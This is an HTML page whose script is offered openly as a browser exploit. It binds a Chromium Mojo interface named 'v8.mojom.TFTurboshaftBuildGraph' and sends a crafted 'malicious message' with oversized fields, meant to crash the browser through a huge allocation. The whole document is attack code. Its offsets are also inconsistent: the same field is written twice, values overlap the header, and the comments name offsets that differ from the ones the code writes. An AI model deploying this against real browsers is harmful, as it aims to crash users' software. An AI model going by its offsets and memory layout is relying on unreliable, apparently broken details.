<pre id="log"></pre>
<script>
(async () => {

    try {
        const provider = Mojo.getInterfaceProvider();
        log('Got interface provider');

        // Bind the V8 Turboshaft interface
        const handle = Mojo.bindInterface('v8.mojom.TFTurboshaftBuildGraph', provider);
        log('Bound to v8.mojom.TFTurboshaftBuildGraph');

        // Build a malicious message that triggers the huge allocation
        const payload = new ArrayBuffer(64);
        const v = new DataView(payload);

        // Mojo message header
        v.setUint32(0, 2, true);          // version
        v.setUint32(4, 0, true);          // flags
        v.setUint32(8, 0, true);          // ordinal – likely 0 for the main method
        v.setUint32(12, 0, true);         // request_id

        // The vulnerable function reads sizes from RSI+0x8, +0x28, +0xA
        // We'll set them to huge values (0xFFFFFFFF) to trigger OOM
        v.setUint32(16, 0xFFFFFFFF, true); // [RSI+0x8] – triggers special processing
        v.setUint32(24, 0xFFFFFFFF, true); // [RSI+0x28] – allocation size
        // The loop bound at [RSI+0xA] is a WORD, we can set it high too
        v.setUint16(10, 0xFFFF, true);    // [RSI+0xA] – loop count
        // Also set the first field to >=2 to trigger the pointer path
        v.setUint32(4, 2, true);          // count field at RSI+0x4

        handle.writeMessage(payload, []);
        log('Malicious message sent! Browser should crash now.');

        setInterval(() => {}, 10000);
    } catch (e) {
        log('Error: ' + e.message);
    }
})();
</script>
